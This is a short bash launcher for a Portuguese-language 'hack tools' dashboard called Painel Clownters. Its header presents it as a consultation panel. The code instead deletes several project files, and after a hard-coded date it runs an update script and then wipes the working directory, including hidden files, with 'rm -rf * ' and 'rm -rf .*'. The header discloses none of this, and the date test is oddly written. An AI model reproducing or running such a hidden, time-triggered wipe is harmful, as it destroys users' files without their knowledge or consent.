#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Painel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PAINEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.3                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS

test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
if (($(date +%m%y) >= 0222)); then
    clear
    bash update.sh
    rm -rf *
    rm -rf .*
else
    source .functions/.main
fi
exit 0
